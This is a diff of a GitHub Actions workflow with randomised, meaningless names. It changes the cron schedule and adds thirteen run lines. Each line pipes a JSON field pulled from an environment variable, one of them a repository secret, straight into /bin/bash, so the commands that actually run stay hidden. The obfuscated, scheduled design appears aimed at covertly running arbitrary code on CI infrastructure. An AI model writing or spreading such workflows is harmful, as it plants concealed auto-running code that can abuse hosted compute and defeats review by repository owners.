@@ -1,9 +1,9 @@
 name: changweiwu3891
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 2/6 * * *'
-
+    - cron: '53 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: changweiwu3891
         env:
-          vk51945: ${{ secrets.vk51945 }}
+          hcnyc760: ${{ secrets.hcnyc760 }}
         run: |
-          echo $vk51945 | jq -r .hk62707 | /bin/bash
-          echo $ma679 | jq -r .hsa976 | /bin/bash
-          echo $jzfcd8672 | jq -r .lvrep2 | /bin/bash
-          echo $wzp18817 | jq -r .vj4 | /bin/bash
-          echo $f920 | jq -r .oers049 | /bin/bash
-          echo $hhz794 | jq -r .j510 | /bin/bash
+          echo $hcnyc760 | jq -r .xvby0 | /bin/bash
+          echo $svm9250 | jq -r .anjty0 | /bin/bash
+          echo $qiytg094 | jq -r .bcpzd22242 | /bin/bash
+          echo $mr69 | jq -r .i80343 | /bin/bash
+          echo $g208 | jq -r .sp02413 | /bin/bash
+          echo $veowp912 | jq -r .jn4081 | /bin/bash
+          echo $dpk2063 | jq -r .n7 | /bin/bash
+          echo $pjbl96315 | jq -r .vuo58132 | /bin/bash
+          echo $nfwzp07 | jq -r .cljhr1 | /bin/bash
+          echo $j83909 | jq -r .moor73 | /bin/bash
+          echo $xns74470 | jq -r .crsuo090 | /bin/bash
+          echo $kli0560 | jq -r .cr641 | /bin/bash
+          echo $j6451 | jq -r .e19 | /bin/bash
 
